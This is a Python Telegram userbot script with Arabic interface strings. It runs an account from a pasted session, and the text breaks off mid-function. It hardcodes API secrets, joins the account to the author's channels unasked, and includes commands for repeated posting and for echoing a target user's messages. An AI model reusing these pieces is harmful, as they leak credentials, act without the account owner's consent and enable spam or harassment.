from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors.rpcerrorlist import MessageNotModifiedError, FloodWaitError
from telethon.tl.types import ChannelParticipantCreator, ChannelParticipantAdmin
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChatBannedRights
from telethon.errors import UserAdminInvalidError, ChatAdminRequiredError
from telethon import events, functions
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import User
from telethon.types import InputWebDocument
from telethon.errors import MediaEmptyError, WebpageMediaEmptyError, WebpageCurlFailedError
from telethon.tl.functions.photos import GetUserPhotosRequest
from telethon.tl.types import InputMediaDice
from telethon.tl.types import InputMessagesFilterDocument
from telethon.utils import get_input_photo
from telethon import functions, events
from telethon.tl.functions.messages import EditMessageRequest
from telethon.tl.types import ChannelParticipantsAdmins, UserStatusEmpty, UserStatusLastMonth, UserStatusLastWeek, UserStatusRecently, UserStatusOnline
from telethon.tl.types import InputPeerUser, InputPeerChannel
from telethon.errors.rpcerrorlist import PeerIdInvalidError
from pySmartDL import SmartDL
from telethon.tl.types import MessageActionChannelMigrateFrom
from telethon import events, Button
from queue import Queue
from telethon.sync import functions
from telethon.tl.types import InputChatUploadedPhoto
from user_agent import generate_user_agent
from telethon import events, functions, sync
from telethon.tl.functions.channels import CreateChannelRequest, EditPhotoRequest
from telethon.tl.functions.messages import ForwardMessagesRequest
from telethon.tl.types import PeerChannel, PeerUser
from telethon.errors import RPCError
from threading import Thread
from telethon.tl.functions.messages import ReportSpamRequest
from telethon import types
from telethon.tl import functions
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon import events, functions
from telethon.tl.types import Message
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.events import NewMessage
from telethon import events 
from telethon.tl.types import InputPeerChat
from telethon import errors
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.types import MessageMediaPhoto
from telethon.tl.types import MessageMediaDocument
from telethon import events, functions, utils
from telethon.tl import functions, types
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telethon.tl.types import MessageEntityMentionName
from telethon.errors import ChatAdminRequiredError
from telethon.tl.types import InputChannel
from deep_translator import GoogleTranslator
from telethon import TelegramClient, events
from telethon.tl.types import ChannelParticipantsAdmins        
from telethon.errors import ChannelInvalidError
from langdetect import detect  
from telethon.tl.types import ChannelParticipantsSearch
from telethon.tl.functions.channels import EditTitleRequest
from datetime import datetime
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.photos import DeletePhotosRequest
from telethon.errors.rpcerrorlist import (
    StickerMimeInvalidError, 
    PhotoExtInvalidError, 
    PhotoCropSizeSmallError, 
    ImageProcessFailedError )
from telethon import TelegramClient, events
from telethon import TelegramClient, events, sync 
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from sqlalchemy.ext.declarative import declarative_base
from gpytranslate import Translator
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.types import InputPhoto
from telethon.tl.functions.channels import EditPhotoRequest
from telethon import events
from telethon import functions
from telethon.tl.functions.messages import GetFullChatRequest
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors.rpcerrorlist import MessageIdInvalidError
from telethon import events, functions, types
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from datetime import datetime
from sqlalchemy import create_engine
from telethon.tl.types import InputMessagesFilterDocument, InputMessagesFilterPhotos
from asyncio import sleep
from sqlalchemy.orm import sessionmaker
from datetime import datetime, timedelta
from telethon.tl.types import Channel, Chat
from dateutil import tz
from emoji import emojize
from datetime import datetime
from telethon.tl.custom import Button
from math import sqrt
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors.rpcerrorlist import WebpageMediaEmptyError
from telethon.tl.functions.messages import DeleteMessagesRequest
import sys
import pytz
import asyncio
import os
import datetime as dt
import base64
import events
import platform
from telethon import version as telethon_version
from telethon import events
from ping3 import ping
import pickle
import string
import re
import json
import mention
import requests
import io
import pybase64
import aiohttp
import random
import threading
import html
import telethon
import logging
import shutil
import time
import os
import pickle
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest

# --- إعدادات الجلسة ---
api_id = '26107707'
api_hash = 'e3774389da1ff2e49f3cfb38c2105c87'
session_str = input("أدخل الجلسة (String Session): ")
client = TelegramClient(StringSession(session_str), api_id, api_hash)

# --- مسارات الملفات ---
response_file = 'responses.pkl'
published_messages_file = 'published_messages.pkl'
muted_users_file = 'muted_users.pkl'
time_update_status_file = 'time_update_status.pkl'
channel_link_file = 'channel_link.pkl'
image_folder = 'image'
last_message_time_file = 'last_message_time.pkl'
last_message_id_file = 'last_message_id.pkl'

# --- إنشاء مجلد الصور إن لم يكن موجوداً ---
if not os.path.exists(image_folder):
    os.makedirs(image_folder)

# --- تحميل البيانات من الملفات إن وُجدت ---
def load_data(file, default):
    if os.path.exists(file):
        with open(file, 'rb') as f:
            return pickle.load(f)
    return default

responses = load_data(response_file, {})
published_messages = load_data(published_messages_file, [])
muted_users = load_data(muted_users_file, {})
time_update_status = load_data(time_update_status_file, {'enabled': False})
channel_link = load_data(channel_link_file, None)
user_last_message_time = {}
user_last_message_id = {}
user_last_message_time_sent = {}
active_publishing_tasks = {}
active_timers = {}
countdown_messages = {}

# --- الانضمام للقنوات المطلوبة ---
async def join_channels():
    try:
        await client(JoinChannelRequest('https://t.me/S21Si'))
        await client(JoinChannelRequest('https://t.me/e_v_ao'))
        print("✅ تم الانضمام إلى القنوات بنجاح.")
    except Exception as e:
        print(f"❌ فشل في الانضمام للقنوات: {e}")

# --- الدالة الرئيسية ---
async def main():
    await join_channels()
    print("✅ البوت يعمل الآن...")

# --- تشغيل العميل والحدث الرئيسي ---
with client:
    client.loop.run_until_complete(main())



active_timers = {}
countdown_messages = {}


image_path = 'local_image.jpg'


account_name = None

def insert_emojis(message, emojis):
    random.shuffle(emojis)
    message_list = list(message)
    emoji_positions = []
    
    for emoji in emojis:
        pos = random.choice(range(len(message_list)))
        while pos in emoji_positions:
            pos = random.choice(range(len(message_list)))
        
        emoji_positions.append(pos)
        message_list[pos] = emoji
    
    return ''.join(message_list)

@client.on(events.NewMessage(from_users='me', pattern='.متت'))
async def update_message(event):
    await event.delete()
    message_text = ' ' * 6
    emojis = ['🤣', '😂', '😹', '🤣', '😂', '😹']
    
    message = await event.respond('🤣😂😹🤣😂😹')
    
    last_message = ""
    start_time = asyncio.get_event_loop().time()
    duration = 5  
    
    while True:
        try:
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > duration:
                break
            
            emoji_string = insert_emojis(message_text, emojis)
            while emoji_string == last_message:
                emoji_string = insert_emojis(message_text, emojis)
            
            last_message = emoji_string
            await message.edit(emoji_string)
            
            await asyncio.sleep(0)

        except Exception as e:
            print(f"Error updating message: {e}")
            break


mimic_user_id = None


@client.on(events.NewMessage(from_users='me', pattern='.تقليد'))
async def set_mimic_user(event):
    global mimic_user_id
    if event.is_reply:
        
        reply_message = await event.get_reply_message()
        mimic_user_id = reply_message.sender_id
        await event.edit(f"**⎙ سيتم تقليد المستخدم {mimic_user_id}.**")
        await event.delete()
    else:
        await event.edit("**⎙ يرجى الرد على رسالة الشخص الذي تريد تقليده.**")


@client.on(events.NewMessage())
async def mimic_user(event):
    global mimic_user_id
    if mimic_user_id and event.sender_id == mimic_user_id:
        
        await client.send_message(event.chat_id, event.text)


@client.on(events.NewMessage(from_users='me', pattern='.ايقاف التقليد'))
async def stop_mimic(event):
    global mimic_user_id
    mimic_user_id = None
    await event.edit("**⎉╎تم ايـقـاف الـتـقـلـيـد .. بنجـاح ☑️.**")
    await event.delete()
    
@client.on(events.NewMessage(from_users='me', pattern='.انتحار'))
async def suicide_message(event):
    await event.delete()
    
    
    message = await event.respond("**جاري الانتحار .....**")
    
    
    await asyncio.sleep(3)
    
    
    final_message = (
        "تم الانتحار بنجاح😂...\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　／￣￣＼| \n"
        "＜ ´･ 　　 |＼ \n"
        "　|　３　 | 丶＼ \n"
        "＜ 、･　　|　　＼ \n"
        "　＼＿＿／∪ _ ∪) \n"
        "　　　　　 Ｕ Ｕ"
    )
    
    await message.edit(final_message)

def insert_emojis(message, emojis):
    random.shuffle(emojis)
    message_list = list(message)
    emoji_positions = []
    
    for emoji in emojis:
        pos = random.choice(range(len(message_list)))
        while pos in emoji_positions:
            pos = random.choice(range(len(message_list)))
        
        emoji_positions.append(pos)
        message_list[pos] = emoji
    
    return ''.join(message_list)

@client.on(events.NewMessage(from_users='me', pattern='.شرير'))
async def update_message(event):
    await event.delete()
    message_text = ' ' * 6
    emojis = ['😈', '💀', '👿', '🔪', '☠️', '👹']
    
    message = await event.respond('👿💀👹👿🔪☠️')
    
    last_message = ""
    start_time = asyncio.get_event_loop().time()
    duration = 5  
    
    while True:
        try:
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > duration:
                break
            
            emoji_string = insert_emojis(message_text, emojis)
            while emoji_string == last_message:
                emoji_string = insert_emojis(message_text, emojis)
            
            last_message = emoji_string
            await message.edit(emoji_string)
            
            await asyncio.sleep(0)

        except Exception as e:
            print(f"Error updating message: {e}")
            break

@client.on(events.NewMessage(from_users='me', pattern='.تفعيل التخزين'))
async def add_group(event):
    await event.delete()
    try:
        if event.is_group:
            # إذا كانت الرسالة في مجموعة
            await event.reply(f"**⎙ الكروب موجود بالفعل. سيتم تفعيل الكود في الكروب السابق.**")
        elif event.is_private:
            # إذا كانت الرسالة في محادثة خاصة
            if os.path.exists('group_id.pkl'):
                with open('group_id.pkl', 'rb') as f:
                    group_id = pickle.load(f)
                try:
                    await client.get_entity(group_id)
                    await event.reply(f"**⎙ الكروب موجود بالفعل. سيتم تفعيل الكود في الكروب السابق.**")
                except ValueError:
                    os.remove('group_id.pkl')
                    group_name = "كروب التخزين"
                    group_bio = "كروب التخزين المخصص من سورس ايفا @S21S6"
                    group = await client(CreateChannelRequest(
                        title=group_name,
                        about=group_bio,
                        megagroup=True
                    ))
                    group_id = group.chats[0].id
                    with open('group_id.pkl', 'wb') as f:
                        pickle.dump(group_id, f)
                    await event.reply(f"**⎙ تم إنشاء كروب جديد وتعيينه لتخزين الرسائل الخاصة**")
            else:
                group_name = "كروب التخزين"
                group_bio = "كروب التخزين المخصص من سورس ايفا @S21S6"
                group = await client(CreateChannelRequest(
                    title=group_name,
                    about=group_bio,
                    megagroup=True
                ))
                group_id = group.chats[0].id
                with open('group_id.pkl', 'wb') as f:
                    pickle.dump(group_id, f)
                await event.reply(f"**⎙ تم إنشاء كروب جديد وتعيينه لتخزين الرسائل الخاصة**")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ: {str(e)}")

@client.on(events.NewMessage(incoming=True))
async def forward_message(event):
    if os.path.exists('group_id.pkl'):
        with open('group_id.pkl', 'rb') as f:
            group_id = pickle.load(f)
    else:
        group_id = None
    if event.is_private and not (await event.get_sender()).bot:
        if group_id:
            await client.forward_messages(group_id, event.message)
            sender = await event.get_sender()
            resalt = f"#التــاكــات\n\n⌔┊المستخدم : <code>{sender.first_name}</code>\n⌔┊الرسالة : {event.message.message}\n⌔┊رابـط الرسـاله : <a href='https://t.me/{sender.username}/{event.message.id}'>اضغط هنا</a>"
            await client.send_message(group_id, resalt, parse_mode="html", link_preview=False)
    elif event.is_group and group_id:
        if event.reply_to_msg_id:
            replied_message = await event.get_reply_message()
            reply_sender = await client.get_entity(replied_message.sender_id)
            bot_id = (await client.get_me()).id
            if replied_message.sender_id == bot_id:
                await client.forward_messages(group_id, event.message)
                hmm = await event.get_chat()
                full = None
                try:
                    full = await event.client.get_entity(event.message.from_id)
                except Exception as e:
                    LOGS.info(str(e))
                messaget = None
                try:
                    messaget = await media_type(event)
                except BaseException:
                    messaget = None
                resalt = f"#التــاكــات\n\n⌔┊الكــروب : <code>{hmm.title}</code>\n⌔┊المـرسـل : <a href='tg://user?id={full.id}'>{full.first_name}</a>\n"
                if messaget is not None:
                    resalt += f"⌔┊الرســالـه : <code>{messaget}</code>\n"
                else:
                    resalt += f"⌔┊الرســالـه : {event.message.message}\n"
                resalt += f"⌔┊رابـط الرسـاله : <a href='https://t.me/c/{hmm.id}/{event.message.id}'>اضغط هنا</a>"
                await client.send_message(group_id, resalt, parse_mode="html", link_preview=False)

@client.on(events.NewMessage(from_users='me', pattern='.تعطيل التخزين'))
async def disable_storage(event):
    await event.delete()
    try:
        if os.path.exists('group_id.pkl'):
            os.remove('group_id.pkl')
            await event.reply("**⎙ تم تعطيل التخزين بنجاح.**")
        else:
            await event.reply("**⎙ التخزين غير مفعل بالفعل.**")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ: {str(e)}")


signature = (
    " {response}\n\n"
)



if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)


if os.path.exists(last_message_time_file):
    with open(last_message_time_file, 'rb') as f:
        user_last_message_time = pickle.load(f)


if os.path.exists(last_message_id_file):
    with open(last_message_id_file, 'rb') as f:
        user_last_message_id = pickle.load(f)


if os.path.exists('path_to_last_message_sent_time_file'):
    with open('path_to_last_message_sent_time_file', 'rb') as f:
        user_last_message_time_sent = pickle.load(f)


@client.on(events.NewMessage(from_users='me', pattern='.رد'))
async def add_response(event):
    await event.delete()
    try:
        photo_path = None

        
        if event.reply_to_msg_id:
            
            replied_message = await client.get_messages(event.chat_id, ids=event.reply_to_msg_id)
            
            
            if replied_message.photo:
                
                photo_path = os.path.join(image_folder, f"{event.reply_to_msg_id}.jpg")
                await client.download_media(replied_message, file=photo_path)

        
        if ' ' in event.raw_text:
            _, response = event.raw_text.split(' ', 1)
            response = response.strip()

            
            full_response = signature.format(response=response)

            
            responses['response'] = {
                'response': full_response,
                'photo': photo_path
            }
            
            
            with open(response_file, 'wb') as f:
                pickle.dump(responses, f)
            
            if photo_path:
                await event.reply("**⎉╎تم إضافة الرد مع الصورة .. بنجـاح ☑️.**")
            else:
                await event.reply("**⎉╎تم إضافة الرد بدون صورة .. بنجـاح ☑️.**")
        else:
            await event.reply("**⎙ يجب استخدام الصيغة الصحيحة: رد الرد**")

    except Exception as e:
        await event.reply(f"حدث خطأ: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def respond_to_message(event):
    try:
        
        if event.is_private:
            user_id = event.sender_id
            current_time = datetime.now()

            
            last_message_time_sent = user_last_message_time_sent.get(user_id, datetime.now() - timedelta(minutes=5))
            last_message_id = user_last_message_id.get(user_id)

            
            if (current_time - last_message_time_sent).total_seconds() >= 240:
                response_data = responses.get('response', {})
                keyword_response = response_data.get('response')
                photo_path = response_data.get('photo')

                if keyword_response:
                    
                    if last_message_id:
                        try:
                            await client.delete_messages(event.chat_id, last_message_id)
                        except Exception as e:
                            print(f"")

                    
                    if photo_path and os.path.exists(photo_path):
                        message = await event.respond(keyword_response, file=photo_path)
                    else:
                        message = await event.respond(keyword_response)
                    
                    
                    user_last_message_id[user_id] = message.id

                else:
                    await event.respond("")
                
                
                user_last_message_time_sent[user_id] = current_time
                with open('path_to_last_message_sent_time_file', 'wb') as f:
                    pickle.dump(user_last_message_time_sent, f)

            
            user_last_message_time[user_id] = current_time
            with open(last_message_time_file, 'wb') as f:
                pickle.dump(user_last_message_time, f)

            
            with open(last_message_id_file, 'wb') as f:
                pickle.dump(user_last_message_id, f)

    except Exception as e:
        print(f"حدث خطأ في الرد على الرسالة: {str(e)}")


@client.on(events.NewMessage(from_users='me', pattern='.add'))
async def add_response(event):
    await event.delete()
    try:
        photo_path = None

        
        if event.reply_to_msg_id:
            
            replied_message = await client.get_messages(event.chat_id, ids=event.reply_to_msg_id)
            
            
            if replied_message.photo:
                
                photo_path = os.path.join(image_folder, f"{event.reply_to_msg_id}.jpg")
                await client.download_media(replied_message, file=photo_path)

        
        if ' ' in event.raw_text:
            _, args = event.raw_text.split(' ', 1)
            if '(' in args and ')' in args:
                keyword, response = args.split('(', 1)[1].split(')', 1)
                keyword = keyword.strip().lower()
                response = response.strip()

                
                responses[keyword] = {
                    'response': response,
                    'photo': photo_path
                }
                
                
                with open(response_file, 'wb') as f:
                    pickle.dump(responses, f)
                
                if photo_path:
                    await event.reply("**⎉╎تم إضافة الرد مع الصورة .. بنجـاح ☑️.**")
                else:
                    await event.reply("**⎉╎تم إضافة الرد بدون صورة .. بنجـاح ☑️.**")
            else:
                await event.reply("**⎙ يجب استخدام الصيغة الصحيحة: .add (الكلمة المفتاحية) الرد.**")
        else:
            await event.reply("**⎙ يجب استخدام الصيغة الصحيحة: .add (الكلمة المفتاحية) الرد.**")

    except Exception as e:
        await event.reply(f"حدث خطأ: {str(e)}")


@client.on(events.NewMessage(from_users='me', pattern='.الردود'))
async def show_responses(event):
    await event.delete()
    try:
        if responses:
            message = "⎙ الردود المضافة:\n"
            for keyword, data in responses.items():
                photo_status = "مضافة إليه صورة" if data['photo'] else "غير مضافة إليه صورة"
                message += f"🔹 الكلمة المفتاحية: {keyword}\n🔸 الرد: {data['response']} ({photo_status})\n"
            await event.reply(message)
        else:
            await event.reply("**⎙ لا توجد ردود مضافة حتى الآن.**")
    except Exception as e:
        await event.reply(f"حدث خطأ: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
    if event.is_private and not (await event.get_sender()).bot:
        message_text = event.raw_text.lower()
        for keyword, data in responses.items():
            if keyword in message_text:
                try:
                    if data['photo']:
                        await client.send_file(event.chat_id, file=data['photo'], caption=data['response'])
                    else:
                        await event.reply(data['response'])
                except Exception as e:
                    await event.reply(f"حدث خطأ: {str(e)}")
                break

async def respond_to_mention(event):
    if event.is_private and not (await event.get_sender()).bot:  
        sender = await event.get_sender()
        await event.reply(f"انتظر يجي المطور @{sender.username} ويرد على رسالتك لا تبقه تمنشنه هواي")
client.add_event_handler(respond_to_mention, events.NewMessage(incoming=True, pattern=f'(?i)@{client.get_me().username}'))

def superscript_time(time_str):
    superscript_digits = str.maketrans('0123456789', '𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟭𝟴𝟵')
    return time_str.translate(superscript_digits)

async def get_account_name():
    me = await client.get_me()
    return re.sub(r' - \d{2}:\d{2}', '', me.first_name)

async def update_username():
    global account_name
    iraq_tz = pytz.timezone('Asia/Baghdad')

    
    if account_name is None:
        account_name = await get_account_name()

    while True:
        now = datetime.now(iraq_tz)
        current_time = superscript_time(now.strftime("%I:%M"))

        
        current_name = await get_account_name()
        if current_name != account_name:
            account_name = current_name  

        
        if time_update_status.get('enabled', False):
            new_username = f"{account_name} - {current_time}"
        else:
            new_username = f"{account_name}"

        try:
            
            await client(UpdateProfileRequest(first_name=new_username))
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"Error updating username: {e}")
        
        
        seconds_until_next_minute = 60 - now.second
        await asyncio.sleep(seconds_until_next_minute)


base_images_dir = os.path.join(os.getcwd(), 'images')

@client.on(events.NewMessage(from_users='me', pattern=r'.تكرار (\d+) (\d+) ?([\s\S]*)'))
@client.on(events.NewMessage(from_users='me', pattern=r'.تك (\d+) (\d+) ?([\s\S]*)'))
@client.on(events.NewMessage(from_users='me', pattern=r'.نشر (\d+) (\d+) ?([\s\S]*)'))
async def start_repeating_process(event):
    await event.delete()
    try:
        seconds = int(event.pattern_match.group(1))
        repeat_count = int(event.pattern_match.group(2))
        custom_text = event.pattern_match.group(3)
        
        
        if seconds < 40:
            await event.reply("**⎙ يجب أن يكون الوقت المحدد لا يقل عن 40 ثانية.**")
            return

        process_images_dir = None
        media_files = []

        if event.is_reply:
            message = await event.get_reply_message()
            
            
            process_id = int(time.time())  
            process_images_dir = os.path.join(base_images_dir, str(process_id))
            os.makedirs(process_images_dir)

            
            if message.media:
                if message.grouped_id:  
                    messages = await client.get_messages(event.chat_id, min_id=message.id - 10, max_id=message.id + 10)
                    for msg in messages:
                        if msg.grouped_id == message.grouped_id and msg.photo:
                            file_path = os.path.join(process_images_dir, f"image_{msg.id}.jpg")
                            await msg.download_media(file=file_path)
                            media_files.append(file_path)
                else:
                    if message.photo:
                        file_path = os.path.join(process_images_dir, f"image_{message.id}.jpg")
                        await message.download_media(file=file_path)
                        media_files.append(file_path)

            if not media_files and not custom_text:
                await event.reply("**⎙ يجب تحديد نص مخصص أو الرد على صورة.**")
                return

        async def task():
            for i in range(repeat_count):
                if media_files:
                    await client.send_file(event.chat_id, media_files, caption=custom_text)
                else:
                    await client.send_message(event.chat_id, custom_text)
                
                await asyncio.sleep(seconds)
            
            
            if process_images_dir and os.path.exists(process_images_dir):
                shutil.rmtree(process_images_dir)
            
            active_publishing_tasks.pop(event.chat_id, None)

        task = asyncio.create_task(task())
        
        
        if event.chat_id not in active_publishing_tasks:
            active_publishing_tasks[event.chat_id] = []
        active_publishing_tasks[event.chat_id].append((task, process_images_dir))
        
        
        await asyncio.sleep(2)
        confirmation_message = await event.reply(f"سيتم إرسال الرسالة كل {seconds} ثانية لـ {repeat_count} مرات.")

        
        await asyncio.sleep(1)
        await event.delete()
        await confirmation_message.delete()

    except Exception as e:
        await event.reply(f"⎙ حدث خطأ: {e}")

@client.on(events.NewMessage(from_users='me', pattern=r'.ايقاف النشر التلقائي'))
async def stop_sending(event):
    await event.delete()
    try:
        if event.chat_id in active_publishing_tasks:
            for task, process_images_dir in active_publishing_tasks[event.chat_id]:
                task.cancel()
                
                if process_images_dir and os.path.exists(process_images_dir):
                    shutil.rmtree(process_images_dir)
            
            del active_publishing_tasks[event.chat_id]

            
            confirmation_message = await event.reply("   ‌‎✓ تم إيقاف جميع عمليات النشر المفعله   ‌‎⎙.")
            
            
            await asyncio.sleep(1)
            await event.delete()
            
            
            await asyncio.sleep(3)
            await confirmation_message.delete()

        else:
            await event.reply("   ‌‎⎙ لا توجد عمليات نشر فعّالة لإيقافها.")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ: {e}")


YOUTUBE_API_KEY = 'AIzaSyBfb8a-Ug_YQFrpWKeTc88zuI6PmHVdzV0'
YOUTUBE_API_URL = 'https://www.googleapis.com/youtube/v3/search'

@client.on(events.NewMessage(from_users='me', pattern=r'.يوتيوب (.+)'))
async def youtube_search(event):
    await event.delete()
    query = event.pattern_match.group(1)
    
    async with aiohttp.ClientSession() as session:
        async with session.get(YOUTUBE_API_URL, params={
            'part': 'snippet',
            'q': query,
            'key': YOUTUBE_API_KEY,
            'type': 'video',
            'maxResults': 1
        }) as response:
            data = await response.json()
            if data['items']:
                video_id = data['items'][0]['id']['videoId']
                video_url = f"https://www.youtube.com/watch?v={video_id}"
                await event.reply(f"📹 هنا رابط الفيديو الذي تم العثور عليه:\n{video_url}")
            else:
                await event.reply("⎙ لم يتم العثور على فيديو يتطابق مع العنوان المطلوب.")

@client.on(events.NewMessage(from_users='me', pattern='.تفعيل الاسم الوقتي'))
async def enable_time_update(event):
    await event.delete()
    global time_update_status
    time_update_status['enabled'] = True
    with open(time_update_status_file, 'wb') as f:
        pickle.dump(time_update_status, f)
    reply = await event.reply("✓ تم تفعيل الاسم مع الوقت   ‌‎⎙.")
    await event.delete()  

    await asyncio.sleep(1)
    await reply.delete()  

@client.on(events.NewMessage(from_users='me', pattern='.تعطيل الاسم الوقتي'))
async def disable_time_update(event):
    await event.delete()
    global time_update_status
    time_update_status['enabled'] = False
    with open(time_update_status_file, 'wb') as f:
        pickle.dump(time_update_status, f)
    
    
    if account_name:
        iraq_tz = pytz.timezone('Asia/Baghdad')
        now = datetime.now(iraq_tz)
        current_name = re.sub(r' - \d{2}:\d{2}', '', account_name)
        new_username = f"{current_name}"
        
        try:
            await client(UpdateProfileRequest(first_name=new_username))
            reply = await event.reply("✓ تم تعطيل الاسم وإزالة الوقت من الاسم   ‌‎⎙.")
        except Exception as e:
            reply = await event.reply(f"⎙ حدث خطأ أثناء إزالة الوقت من الاسم: {e}")
    else:
        reply = await event.reply("⎙ لم يتم تعيين اسم الحساب.")
    
    await event.delete()  

    await asyncio.sleep(1)
    await reply.delete()  

@client.on(events.NewMessage(from_users='me', pattern='.اضافة قناة اشتراك (.+)'))
async def add_channel(event):
    await event.delete()
    global channel_link
    channel_link = event.pattern_match.group(1)
    with open(channel_link_file, 'wb') as f:
        pickle.dump(channel_link, f)
    await event.reply(f"   ‌‎⎙ تم تعيين رابط القناة إلى: {channel_link}")
    await event.delete()  

@client.on(events.NewMessage(from_users='me', pattern= '.مسح القناة' ))
async def remove_channel(event):
    await event.delete()
    global channel_link
    channel_link = ''
    with open(channel_link_file, 'wb') as f:
        pickle.dump(channel_link, f)
    reply = await event.reply("⎙ تم مسح رابط القناة.")
    await event.delete()  
    await asyncio.sleep(3)
    await reply.delete()  

async def is_subscribed(user_id):
    if not channel_link:
        return True  
    channel_username = re.sub(r'https://t.me/', '', channel_link)
    try:
        offset = 0
        limit = 100
        while True:
            participants = await client(GetParticipantsRequest(
                channel=channel_username,
                filter=ChannelParticipantsSearch(''),
                offset=offset,
                limit=limit,
                hash=0
            ))
            if not participants.users:
                break
            for user in participants.users:
                if user.id == user_id:
                    return True
            offset += len(participants.users)
        return False
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return await is_subscribed(user_id)
    except Exception as e:
        print(f"Error checking subscription: {e}")
        return False

@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
    if event.is_private and not (await event.get_sender()).bot:  
        sender = await event.get_sender()
        if sender.phone == '42777':
            
            return
        if not await is_subscribed(event.sender_id):
            await event.reply(f"لا يمكنك مراسلتي الى بعد الاشتراك في قناتي: {channel_link}")
            await client.delete_messages(event.chat_id, [event.id])
        else:
            message_text = event.raw_text.lower()

@client.on(events.NewMessage(from_users='me', pattern='.del'))
async def delete_message(event):
    await event.delete()
    
    await asyncio.sleep(2)
    await event.delete()
    
    try:
        
        command, keyword = event.raw_text.split(' ', 1)
        keyword = keyword.lower()
        
        if keyword in responses:
            del responses[keyword]
            
            with open(response_file, 'wb') as f:
                pickle.dump(responses, f)
            
            
            confirmation_message = await event.reply("✓ تم حذف الرد   ‌‎⎙")
            
            
            await asyncio.sleep(2)
            await confirmation_message.delete()
        else:
            warning_message = await event.reply("⎙ لم يتم العثور على الكلمة المحددة")
            
            
            await asyncio.sleep(2)
            await warning_message.delete()
    
    
    except ValueError:
        error_message = await event.reply("⎙ استخدم الصيغة: del الكلمة المفتاحية")
        
        
        await asyncio.sleep(2)
        await error_message.delete()

@client.on(events.NewMessage(from_users='me', pattern='.عداد'))
async def countdown_timer(event):
    await event.delete()
    try:
        
        command, args = event.raw_text.split(' ', 1)
        minutes = int(args.strip().strip('()'))

        
        if event.chat_id in active_timers:
            active_timers[event.chat_id].cancel()
            del active_timers[event.chat_id]
            
            if event.chat_id in countdown_messages:
                await client.delete_messages(event.chat_id, countdown_messages[event.chat_id])
                del countdown_messages[event.chat_id]

        async def timer_task():
            nonlocal minutes
            total_seconds = minutes * 60
            
            countdown_message = await event.reply("**   ‌‎⎙ سيبدأ العد التنازلي بعد 3 **")

            
            countdown_messages[event.chat_id] = countdown_message.id

            
            await asyncio.sleep(1)
            await countdown_message.edit("   ‌‎⎙** سيبدأ العد التنازلي بعد 2 **")


            
            await asyncio.sleep(1)
            
            
            countdown_message = await countdown_message.edit(f"   ‌‎⎙** سيبدأ العد التنازلي بعد 1**")
            
            
            while total_seconds > 0:
                minutes, seconds = divmod(total_seconds, 60)
                new_text = f"   ‌‎⎙** {minutes:02}:{seconds:02} متبقية**"
                await asyncio.sleep(1)
                total_seconds -= 1

                try:
                    if new_text != countdown_message.text:
                        await countdown_message.edit(new_text)
                except MessageNotModifiedError:
                    pass
            
            await countdown_message.edit("   ‌‎⎙ **الوقت انتهى!**")
            
            

        
        active_timers[event.chat_id] = asyncio.create_task(timer_task())
        
    except (ValueError, IndexError):
        await event.reply("⎙ استخدم الصيغة الصحيحة: عداد (عدد الدقائق)")

@client.on(events.NewMessage(from_users='me', pattern='.توقيف'))
async def stop_timers(event):
    await event.delete()
    if event.chat_id in active_timers:
        
        active_timers[event.chat_id].cancel()
        del active_timers[event.chat_id]
        
        
        if event.chat_id in countdown_messages:
            try:
                await client.delete_messages(event.chat_id, countdown_messages[event.chat_id])
                del countdown_messages[event.chat_id]
            except Exception as e:
                print(f"Error deleting countdown message: {e}")

        
        stop_message = await event.reply("⎙ تم إيقاف جميع العدادات التنازلية.")
        
        
        await asyncio.sleep(3)
        await stop_message.delete()
    else:
        
        no_timer_message = await event.reply("   ‌‎⎙ لا توجد عدادات تنازلية نشطة لإيقافها.")
        
        
        await asyncio.sleep(3)
        await no_timer_message.delete()

@client.on(events.NewMessage(from_users='me', pattern='.الاسم'))
async def set_account_name(event):
    await event.delete()
    global account_name
    try:
        
        command, text = event.raw_text.split(' ', 1)
        if '(' in text and ')' in text:
            account_name = text.split('(', 1)[1].split(')')[0].strip()
        else:
            await event.reply("⚠️ استخدم الصيغة: .الاسم (الاسم الجديد)")
            return
        
        
        iraq_tz = tz.gettz('Asia/Baghdad')
        now = datetime.now(iraq_tz)
        current_time = superscript_time(now.strftime("%I:%M"))
        new_username = f"{account_name} - {current_time}"
        
        try:
            await client(UpdateProfileRequest(first_name=new_username))
            await event.reply(f"✓ تم تغيير اسم الحساب إلى {new_username}⎙")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            await client(UpdateProfileRequest(first_name=new_username))
            await event.reply(f"⎙ تم تغيير اسم الحساب إلى {new_username}")
        except Exception as e:
